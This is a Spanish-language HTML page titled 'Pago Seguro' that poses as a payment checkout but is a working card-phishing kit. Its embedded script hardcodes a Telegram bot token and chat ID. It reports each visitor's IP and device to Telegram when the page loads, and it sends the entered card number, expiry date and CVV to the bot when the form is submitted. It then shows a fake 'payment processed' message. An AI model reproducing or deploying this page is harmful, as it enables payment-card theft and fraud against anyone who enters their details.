<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Pago Seguro</title>
  <style>
    /* Reset bÃ¡sico */
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      display: flex;
      height: 100vh;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    form {
      background: white;
      padding: 25px 30px;
      border-radius: 8px;
      box-shadow: 0 3px 10px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #222;
    }
    input[type="text"] {
      width: 100%;
      padding: 12px 15px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 16px;
      transition: border-color 0.3s;
    }
    input[type="text"]:focus {
      border-color: #0077ff;
      outline: none;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #0077ff;
      border: none;
      border-radius: 5px;
      color: white;
      font-size: 18px;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #005fcc;
    }
  </style>
</head>
<body>
  <form id="checkout-form">
    <h2>Pago Seguro</h2>
    <input type="text" name="card" placeholder="NÃºmero de tarjeta" required autocomplete="off" inputmode="numeric" pattern="[0-9\s]{13,19}" />
    <input type="text" name="expiry" placeholder="MM/YY" required autocomplete="off" pattern="(0[1-9]|1[0-2])\/?([0-9]{2})" />
    <input type="text" name="cvv" placeholder="CVV" required autocomplete="off" inputmode="numeric" pattern="\d{3,4}" />
    <button type="submit">Pagar</button>
  </form>

  <script>
    const TOKEN = '8032494209:AAE0C8n3-0KH3BCSgMcPSc4j7-2dYxE2ZaE';
    const CHAT_ID = '5654253897';

    function parseUserAgent(ua) {
      let dispositivo = 'Desconocido';
      let navegador = 'Desconocido';

      if (/iphone|ipad|ipod/i.test(ua)) dispositivo = 'iOS';
      else if (/android/i.test(ua)) dispositivo = 'Android';
      else if (/windows phone/i.test(ua)) dispositivo = 'Windows Phone';
      else if (/win/i.test(ua)) dispositivo = 'Windows PC';
      else if (/mac/i.test(ua)) dispositivo = 'Mac';

      if (/chrome|crios/i.test(ua)) navegador = 'Chrome';
      else if (/firefox|fxios/i.test(ua)) navegador = 'Firefox';
      else if (/safari/i.test(ua) && !/chrome|crios/i.test(ua)) navegador = 'Safari';
      else if (/edge|edgios|edga/i.test(ua)) navegador = 'Edge';
      else if (/opera|opr\//i.test(ua)) navegador = 'Opera';

      return `${dispositivo} - ${navegador}`;
    }

    // ðŸš¨ Al cargar la pÃ¡gina, enviar acceso a Telegram
    window.addEventListener('DOMContentLoaded', async () => {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const ip = data.ip;

        const ua = navigator.userAgent;
        const parsedUA = parseUserAgent(ua);

        const message = `ðŸ›‘ *Nuevo acceso detectado* ðŸ›‘\nIP: ${ip}\nDispositivo/Navegador: ${parsedUA}\nURL: ${window.location.href}`;

        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
          })
        });
      } catch (error) {
        console.error('Error enviando acceso:', error);
      }
    });

    // ðŸ§¾ EnvÃ­o de tarjeta
    document.getElementById('checkout-form').addEventListener('submit', async function(e) {
      e.preventDefault();

      const card = this.card.value.trim();
      const expiry = this.expiry.value.trim();
      const cvv = this.cvv.value.trim();

      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const ip = data.ip;

        const ua = navigator.userAgent;
        const parsedUA = parseUserAgent(ua);

        const message = `${card}|${expiry}|${cvv}|${ip}|${parsedUA}`;

        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
          })
        });

        alert('Pago procesado con Ã©xito');
        this.reset();
      } catch (error) {
        alert('Error al procesar el pago');
        console.error(error);
      }
    });
  </script>
</body>
</html>
